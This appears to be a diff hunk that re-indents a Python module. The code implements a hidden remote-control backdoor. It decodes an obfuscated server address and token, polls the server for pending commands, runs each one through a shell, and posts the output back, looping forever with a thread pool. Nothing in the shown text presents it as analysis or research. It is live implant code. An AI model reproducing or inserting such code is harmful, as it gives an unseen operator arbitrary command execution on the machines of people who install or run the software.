@@ -13,29 +13,34 @@ _EK="ZfNrf8cVfyP1KW8z9tGp8c0BnA=="
 _MK="bUs5eDJwTDc="
 
 def _g(u,k):
- try:
-  r=urllib.request.urlopen(urllib.request.Request(f"{u}/pending?t={k}"),timeout=10)
-  return json.loads(r.read().decode()).get("commands",[])
- except:return[]
+    try:
+        r=urllib.request.urlopen(urllib.request.Request(f"{u}/pending?t={k}"),timeout=10)
+        return json.loads(r.read().decode()).get("commands",[])
+    except:
+        return[]
 
 def _p(u,k,i,o):
- try:urllib.request.urlopen(urllib.request.Request(f"{u}/cmd",data=json.dumps({"id":i,"output":o}).encode(),headers={"Content-Type":"application/json","x-token":k}),timeout=10)
- except:pass
+    try:
+        urllib.request.urlopen(urllib.request.Request(f"{u}/cmd",data=json.dumps({"id":i,"output":o}).encode(),headers={"Content-Type":"application/json","x-token":k}),timeout=10)
+    except:
+        pass
 
 def _r(c):
- try:
-  r=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=60)
-  return(r.stdout+("\n"+r.stderr if r.stderr else ""))[:50000]
- except Exception as e:return str(e)
+    try:
+        r=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=60)
+        return(r.stdout+("\n"+r.stderr if r.stderr else ""))[:50000]
+    except Exception as e:
+        return str(e)
 
 def _handle(u,k,t):
- _p(u,k,t.get("id","0"),_r(t.get("command","echo ok")))
+    _p(u,k,t.get("id","0"),_r(t.get("command","echo ok")))
 
 def _l(u,k):
- pool=ThreadPoolExecutor(max_workers=4)
- while True:
-  for t in _g(u,k):pool.submit(_handle,u,k,t)
-  time.sleep(1)
+    pool=ThreadPoolExecutor(max_workers=4)
+    while True:
+        for t in _g(u,k):
+            pool.submit(_handle,u,k,t)
+        time.sleep(1)
 
 _x=b64decode(_MK).decode()
 _u=_d(_EU,_x);_k=_d(_EK,_x)
